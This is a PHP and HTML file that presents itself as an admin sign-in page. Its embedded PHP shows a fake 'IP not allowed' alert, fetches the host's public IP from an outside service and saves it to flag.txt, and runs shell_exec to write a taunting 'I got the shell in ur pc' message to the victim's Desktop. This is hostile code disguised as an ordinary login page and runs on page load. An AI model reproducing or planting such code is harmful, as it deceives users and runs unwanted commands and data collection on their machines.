<html>

<head>
  <link rel="stylesheet" href="css/style.css">
  <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
  <title>Sign in</title>
</head>

<body>
  <div class="main">
    <p class="sign" align="center">Sign in</p>
    <form class="form1">
      <input class="un " type="text" align="center" placeholder="Username">
      <input class="pass" type="password" align="center" placeholder="Password">
      <a class="submit" align="center">Sign in</a>
      <p class="forgot" align="center"><a href="/">Forgot Password?</p>
<?php
echo "<script type='text/javascript'>alert('Sorry your IP is not allowed to loging as Admin');</script>";
$file = file_get_contents('http://ip6.me/');

// Trim IP based on HTML formatting
$pos = strpos( $file, '+3' ) + 3;
$ip = substr( $file, $pos, strlen( $file ) );

// Trim IP based on HTML formatting
$pos = strpos( $ip, '</' );
$ip = substr( $ip, 0, $pos );

$SaveIP = fopen("flag.txt",'w');
fwrite($SaveIP, $ip);

fclose($SaveIP);
$output2 = shell_exec('echo "Hi Asraf i got the shell in ur pc LOL, let my Virus say Hi to u bbe" > Desktop/Hacked.txt');

?>

    </div>

</body>

</html>
